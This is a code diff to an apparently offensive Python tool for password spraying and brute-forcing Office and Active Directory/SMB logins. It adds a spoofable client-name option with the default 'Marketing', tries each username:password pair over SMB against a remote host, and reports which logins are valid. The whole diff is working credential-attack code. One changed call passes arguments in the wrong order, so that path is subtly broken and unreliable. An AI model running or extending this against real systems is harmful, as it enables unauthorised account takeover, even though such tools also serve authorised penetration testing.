@@ -27,13 +27,15 @@ def switch():
     parser.add_argument(
         '-pf', '--passfile', help='list of password to test [cannot be used with -p or --password]', required=False)
     parser.add_argument(
-        '-policy', '--policy', help='password policy to be applied [attempts,wait in seconds]', required=True)
+        '-policy', '--policy', help='password policy to be applied [attempts,wait in seconds]', required=False)
     parser.add_argument(
         '-v', '--verbose', help='read output to terminal', required=False, action='store_true')
     parser.add_argument(
         '-ip', '--host', help='hostname/IP of the remote machine', required=False)
     parser.add_argument(
         '-s', '--servername', help='the computername or servername of the remote machine', required=False)
+    parser.add_argument(
+        '-c', '--client', help='the computername of the client machine', required=False)
     
     return parser.parse_args()
 
@@ -195,7 +197,7 @@ def hybrid_office_worker(policy, user, _pass):
     else:
         print(Fore.RED +"[!]Unknown input. Check the usage")
 
-def sprayAD(host,username,password,computerName=""):
+def sprayAD(host,username,password,client,computerName=""):
     if verbose:
         print(Fore.YELLOW +
               "Checking credentials {0}:{1}".format(username, password))
@@ -203,14 +205,14 @@ def sprayAD(host,username,password,computerName=""):
     if not computerName:
         computerName = getServerName(IP)
 
-    conn = SMBConnection(username,password,computerName,use_ntlm_v2 = True, is_direct_tcp=True)
-    if conn.connect(IP,port):
-        print(Fore.GREEN+"VALID LOGIN on {}:{} using {}:{}".format(IP,service,username,password))
+    conn = SMBConnection(username,password,client,computerName,use_ntlm_v2 = True,is_direct_tcp=True)
+    if conn.connect(IP,int(port)):
+        print(Fore.GREEN+"VALID LOGIN on {}:{} using {}:{}".format(IP,port,username,password))
     else:
-        print(Fore.RED+"INVALID LOGIN on {}:{} using {}:{}".format(IP,service,username,password))
+        print(Fore.RED+"INVALID LOGIN on {}:{} using {}:{}".format(IP,port,username,password))
     
 
-def hybrid_smb_worker(host, policy, user, _pass,computerName=""):
+def hybrid_smb_worker(host, policy, user, _pass,client, computerName=""):
     #Run hybrid bruteforcing here
     attempts = 1
     
@@ -266,7 +268,7 @@ def getServerName(IP):
     try:
         server = NetBIOS()
         servername = server.queryIPForName(IP)
-        return servername
+        return servername[0]
     except:
         print(Fore.RED+"You need to porvide the remote computer or server name")
         exit(0)
@@ -287,6 +289,7 @@ if __name__ == '__main__':
     verbose = options.verbose
     host = options.host
     servername = options.servername
+    client = options.client
 
     #Perform checks to make sure options are correct
     if username and userfile:
@@ -308,6 +311,9 @@ if __name__ == '__main__':
         if single_test:
             brute_office(username, password)
         else:
+            if not policy:
+                ArgumentParser().print_help()
+                sys.exit(0)
             if username and passfile:
                 passfile = open(passfile, 'r')
                 hybrid_office_worker(policy, username, passfile)
@@ -328,12 +334,17 @@ if __name__ == '__main__':
         print(Fore.BLUE+"Starting AD/SMB Password Spraying/Bruteforce")
         if not servername:
             servername = ""
+        if not client:
+            client = "Marketing"
         if not host:
             ArgumentParser().print_help()
             sys.exit(0)
         if single_test:
-            sprayAD(host, username, password, servername)
+            sprayAD(host, username, password, client, servername)
         else:
+            if not policy:
+                ArgumentParser().print_help()
+                sys.exit(0)
             if username and passfile:
                 passfile = open(passfile, 'r')
                 hybrid_smb_worker(host, policy, username, passfile, servername)
